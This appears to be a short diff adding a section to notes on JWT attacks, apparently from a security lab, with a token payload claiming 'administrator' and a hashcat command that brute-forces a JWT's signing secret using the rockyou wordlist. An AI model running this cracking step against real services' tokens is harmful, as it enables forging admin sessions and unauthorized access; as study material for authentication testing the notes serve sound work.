@@ -44,3 +44,6 @@
     "sub": "administrator",
     "exp": 1660654482
 }
+# 3. JWT authentication bypass via weak signing key
+
+hashcat -a 0 -m 16500 eyJraWQiOiJhODBlZmVkMi0zNmU... /usr/share/wordlists/rockyou.txt
